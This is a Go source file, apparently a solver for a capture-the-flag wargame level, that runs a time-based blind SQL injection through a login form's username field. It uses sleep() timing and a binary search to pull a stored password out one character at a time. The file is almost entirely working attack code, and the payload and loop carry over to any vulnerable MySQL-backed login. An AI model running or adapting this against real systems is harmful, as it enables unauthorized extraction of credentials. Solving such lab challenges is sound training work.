package fun

import (
	"github.com/valyala/fasthttp"
	"log"
	"sqli/utils/http"
	"sqli/utils/http/post"
	"strconv"
)

func Binarysearch(i int,httpClient *fasthttp.Client,args fasthttp.Args) string {
	min:=0
	max:=128
	for max-min!=1 {
		mid:=(min+max)/2
		payload:="natas18\" and if("+strconv.Itoa(mid)+"<ascii(mid(password,"+strconv.Itoa(i)+",1)),sleep(3),1) -- +"
		args.Set("username",payload)
		log.Println(payload)
		req := post.Form(args)
		defer fasthttp.ReleaseRequest(req)
		_,err := http.Response(httpClient,req)
		if err!=nil {
			min=mid
		} else {
			max=mid
		}
	}
	return string(max)
}